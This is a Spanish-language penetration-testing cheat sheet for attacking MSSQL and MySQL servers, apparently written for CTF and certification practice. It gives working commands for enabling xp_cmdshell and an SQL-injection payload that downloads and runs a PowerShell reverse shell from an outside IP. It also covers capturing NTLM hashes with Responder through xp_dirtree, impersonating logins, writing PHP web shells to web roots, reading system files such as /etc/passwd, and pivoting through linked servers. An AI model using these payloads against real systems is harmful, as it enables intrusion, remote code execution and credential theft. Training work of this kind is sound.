#sql #mysql #mssql
## Puertos por Defecto

| Base de Datos | Puertos Comunes                    |
| - | - |
| ssh -MSSQL    | TCP/1433, UDP/1434 (2433 "oculto") |
| MySQL         | TCP/3306                           |
## Enumeración Inicial 
### MSSQL
#### Nmap
```bash
nmap -Pn -sV -sC -p1433 $target
nmap -Pn -p1433 --script=ms-sql-* <target>
```
#### MySQL
```bash
nmap -Pn -sV -sC -p3306 <target>
nmap -Pn -p3306 --script=mysql-* <target>
```

## Métodos de Autenticación 
### MSSQL

| Tipo                         | Descripción                                                                                               |
| ---------------------------- | --------------------------------------------------------------------------------------------------------- |
| **Autenticación de Windows** | Usa cuentas de Active Directory (AD) o locales. Si ya estás autenticado en AD, no necesitas credenciales. |
| **Modo Mixto**               | Acepta cuentas SQL internas (usuario/contraseña) y autenticación de Windows.                              |
### MySQL
Autenticación basada en credenciales
## Conexión a Bases de Datos

### MySQL

```bash
mysql -u usuario -pContraseña -h $target
```

### MSSQL (Desde Windows)
- Con SQLCMD

	```cmd
	sqlcmd -S $target -U usuario -P 'Contraseña'
	```
- Con PowerUpSQL
	```powershell
	Import-Module .\PowerUpSQL.ps1
	Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
	```

### MSSQL - Linux `sqsh`

```bash
sqsh -S $target -U usuario -P 'Contraseña' 
```
Se puede añadir la flag `-h` para proporcionar una salida más limpia, sin encabezados ni pies de página

### MSSQL - Linux `Impacket mssqlclient`

```bash
impacket-mssqlclient usuario@$target -p 1433
```
#### Como usuario de AD
Si nos autenticamos con un usuario Windows, podemos hacerlo con la flag `-windows-auth`
```bash
mssqlclient.py usuario@$target -p 1433 -windows-auth
```
Puede ser útil obtener el hashNTMLv2 del usuario `mssqlsvc` y tras craquear la contraseña conectarnos nuevamente con este usuario  y `-windows-auth` 

## Enumeración de Bases de Datos

### Listar Bases de Datos
- MySQL
    ```sql
    SHOW DATABASES;
    ```
- MSSQL
    ```sql
    SELECT name FROM master.dbo.sysdatabases
    GO
    ```
### Seleccionar Base de Datos
- MySQL
    ```sql
    USE <nombre_base>;
    ```
- MSSQL
	```sql
	USE <nombre_base>
	GO
	```

### Listar Tablas

- MySQL
    ```sql
    SHOW TABLES;
    ```
- MSSQL
    ```sql
    SELECT table_name FROM <nombre_base>.INFORMATION_SCHEMA.TABLES
    GO
    ```

### Obtener Datos de una Tabla

- MySQL
    ```sql
    SELECT * FROM <nombre_tabla>;
    ```
- MSSQL
    ```sql
    SELECT * FROM <nombre_tabla>
    GO
    ```
## Ataques a Bases de Datos
No se enumeran algunas funcionalidades, como `xp_regwrite` que se podrían utilizar para elevar privilegios
### Ejecución de Comandos (MSSQL)
Habilitar y usar `xp_cmdshell` :
```sql
EXECUTE sp_configure 'show advanced options', 1;
GO
RECONFIGURE;
GO
EXECUTE sp_configure 'xp_cmdshell', 1;
GO
RECONFIGURE;
GO
EXECUTE xp_cmdshell 'whoami';
GO
```
Ejemplo de ejecución con `invoke-conpty` dentro de una sqli
```
';EXECUTE xp_cmdshell 'powershell -ep bypass -nop -c IEX (New-Object Net.WebClient).DownloadString(''http://192.168.45.182:8000/Invoke-ConPtyShell.ps1'');Invoke-ConPtyShell 192.168.45.182 4444;';--
```


### Captura de Hashes (MSSQL)
Usando procedimientos almacenados `xp_dirtree` o `xp_subdirs` para enviar una solicitud SMB a un servidor malicioso:

1. Debemos iniciar un servidor SMB:
    ```bash
    sudo responder -I eth0
    ```
    O con Impacket:
    ```bash
    sudo impacket-smbserver share ./ -smb2support
    ```
2. Ejecuta en MSSQL:
    ```mssql
    EXEC xp_dirtree '\\10.10.10.1\share\';
    GO
    ```    
### Suplantación de Usuarios (MSSQL)
El servidor SQL tiene unos servicios especiales, `IMPERSONATE`,  que permite ejecutar al usuario acciones con los permisos de otro usuario
1. Comprobar si nuestro usuario tiene permisos de administrador:
	```sql
	SELECT SYSTEM_USER
	SELECT IS_SRVROLEMEMBER('sysadmin')
	go
	```
1. Identificar usuarios que podemos suplantar:
    ```sql
    SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
    GO
    ```
3. Suplantar usuario:
    ```sql
    EXECUTE AS LOGIN = 'nombre_usuario';
    GO
    ```
4. Revertir al usuario originall:
    ```sql
    REVERT;
    GO
    ```


## Escritura/lectura de Archivos

### MySQL
#### Variable `secure_file_priv`
Tanto para escritura como para lectura, la variable `secure_file_priv` nos indica si podemos realizar operaciones de lectura y escritura:
- **Sin contenido**: Podemos leer escribir en cualquier directorio
- **Con directorio como contenido**: Sólamente podemos importar/exportar archivos a ese directorio
- **Valor `null`**: El servidor deshabilita la subida/bajada de archivos
	```sql
	show variables like "secure_file_priv";
	```
#### Escritura
Escribir un archivo PHP (ejemplo para un shell web):

```sql
SELECT "<?php echo shell_exec($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```
#### Lectura
```sql
SELECT LOAD_FILE('/etc/passwd');
```
### MSSQL
#### Escritura
##### Habilitar Automation Procedures
Para poder escribir en archivos debe estar habilitada esta opción (requiere permisos adminsitrativos)
```sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```
##### Crear un arhivo
```sql
DECLARE @OLE INT;
DECLARE @FileID INT;
EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\inetpub\wwwroot\webshell.php', 8, 1;
EXEC sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
EXEC sp_OADestroy @FileID;
EXEC sp_OADestroy @OLE;
GO
```

#### Lectura

```sql
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;
GO
```


## Servidores Enlazados (MSSQL)

Podemos conocer el nombre de nuestro servidor escribiendo lo siguiente: 
```sql
select @@servername as currentserver;
go
```

### Explorar servidores enlazados

```sql
SELECT srvname, isremote FROM sysservers;
GO
```
### Ejecutar comandos en un servidor enlazado:
```sql
EXECUTE('select @@servername, @@version') AT [nombre_servidor];
GO
```
Ejemplo (Obtención de flag en un ctf):  
```sql
execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv];
```
